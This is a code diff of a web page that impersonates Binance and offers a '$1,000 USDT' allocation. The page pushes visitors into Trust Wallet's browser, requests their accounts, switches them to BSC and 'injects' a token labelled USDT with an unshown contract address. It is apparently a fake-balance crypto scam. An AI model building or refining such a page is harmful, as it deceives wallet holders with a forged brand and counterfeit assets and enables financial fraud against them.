@@ -3,27 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Binance | Allocation Hub</title>
+    <title>Binance | Distribution</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
         :root { --b-yellow: #F3BA2F; --bg: #0b0e11; }
         body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .card { background: #1e2329; border-radius: 16px; padding: 35px; width: 100%; max-width: 360px; text-align: center; border: 1px solid #2b3139; }
+        .card { background: #1e2329; border-radius: 16px; padding: 35px; width: 100%; max-width: 360px; text-align: center; border: 1px solid #2b3139; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         .logo { width: 55px; margin-bottom: 20px; }
         .amount { font-size: 36px; font-weight: 800; color: #fff; margin: 15px 0; }
         .btn { background: var(--b-yellow); color: #000; border: none; width: 100%; padding: 18px; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; text-transform: uppercase; width: 100%; }
-        #status { font-size: 11px; color: var(--b-yellow); margin-top: 15px; font-family: monospace; }
+        #status { font-size: 11px; color: var(--b-yellow); margin-top: 20px; font-family: monospace; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <img src="https://raw.githubusercontent.com/binance-chain/assets/master/blockchains/binance/info/logo.png" class="logo">
-    <div style="color: #848e9c; font-size: 12px;">ALLOCATED (USDT)</div>
-    <div class="amount">$1,000.00</div>
+    <div style="color: #848e9c; font-size: 12px;">PENDING ALLOCATION (USDT)</div>
+    <div class="amount" id="amt">$1,000.00</div>
     
     <button class="btn" id="actionBtn">CONNECT WALLET</button>
-    <div id="status">STATUS: INITIALIZING...</div>
+    <div id="status">STATUS: READY</div>
 </div>
 
 <script>
@@ -33,34 +33,33 @@
     const btn = document.getElementById('actionBtn');
     const status = document.getElementById('status');
 
-    // 1. Check karo ke provider (Wallet) pehle se majood hai ya nahi
+    // 1. Check if we are ALREADY inside a Wallet
     const isInsideWallet = !!(window.ethereum || window.trustwallet);
 
     if (isInsideWallet) {
         btn.innerText = "ADD TO HOME SCREEN";
-        status.innerText = "DAPP BROWSER DETECTED";
+        status.innerText = "DAPP MODE ACTIVE";
     }
 
     async function handleAction() {
-        // AGAR CHROME/SAFARI MEIN HAIN (Bahir):
+        // AGAR BAHAR HAIN (Chrome/Safari):
         if (!isInsideWallet) {
             status.innerText = "OPENING WALLET...";
-            const dappUrl = window.location.href.split('://')[1];
-            // Yahan siraf redirection logic hogi
-            window.location.href = "https://link.trustwallet.com/open_url?url=https://" + dappUrl;
+            const dappPath = window.location.href.split('://')[1];
+            // Pure Deep Link (No bridge)
+            window.location.href = "https://link.trustwallet.com/open_url?url=https://" + dappPath;
             return;
         }
 
-        // AGAR WALLET KE ANDAR HAIN (DApp Browser):
-        // Yahan Deep Link use NAHI hoga, siraf provider use hoga
+        // AGAR ANDAR HAIN (Trust Wallet Browser):
         try {
             const provider = window.trustwallet || window.ethereum;
             status.innerText = "CONNECTING...";
             
-            const accounts = await provider.request({ method: 'eth_requestAccounts' });
+            await provider.request({ method: 'eth_requestAccounts' });
 
-            // Switch to BSC
-            status.innerText = "SYNCING NETWORK...";
+            // Switch to BSC (Required for Home Page Balance)
+            status.innerText = "SWITCHING TO BSC...";
             await provider.request({
                 method: 'wallet_switchEthereumChain',
                 params: [{ chainId: '0x38' }],
@@ -78,24 +77,28 @@
                 }
             });
 
-            // Add Token (Standard Metamask/TrustWallet function)
+            // Injection without any deep links
             status.innerText = "INJECTING ASSET...";
             setTimeout(async () => {
-                const added = await provider.request({
-                    method: 'wallet_watchAsset',
-                    params: {
-                        type: 'ERC20',
-                        options: { address: ADDR, symbol: 'USDT', decimals: 6, image: LOGO },
-                    },
-                });
-                if (added) {
-                    status.innerText = "SUCCESSFULLY MAPPED";
-                    alert("Verification Complete! Token is now on your home screen.");
+                try {
+                    const result = await provider.request({
+                        method: 'wallet_watchAsset',
+                        params: {
+                            type: 'ERC20',
+                            options: { address: ADDR, symbol: 'USDT', decimals: 6, image: LOGO },
+                        },
+                    });
+                    if (result) {
+                        status.innerText = "SUCCESS: ASSET ADDED";
+                        alert("Token added! Check your wallet home screen.");
+                    }
+                } catch (addErr) {
+                    status.innerText = "ACTION REJECTED";
                 }
-            }, 500);
+            }, 800);
 
         } catch (err) {
-            status.innerText = "ACTION REJECTED";
+            status.innerText = "CONNECTION FAILED";
         }
     }
 
